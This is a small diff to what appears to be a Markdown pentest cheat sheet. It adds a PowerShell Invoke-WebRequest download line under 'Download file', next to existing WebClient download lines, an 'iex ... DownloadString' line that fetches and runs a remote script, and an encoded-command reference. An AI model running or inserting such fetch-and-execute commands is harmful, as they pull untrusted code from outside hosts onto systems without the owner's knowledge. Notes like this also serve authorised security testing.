@@ -91,6 +91,7 @@ powershell -encodedCommand <b64 code>
 #### Download file
 
 ```
+powershell -c "Invoke-WebRequest -URI '<ip>/<file>' -OutFile '<path>'"
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<ip>/<file>','C:\<path>')"
 iex (New-Object System.Net.Webclient).DownloadString('https://<path>.ps1')
 ```
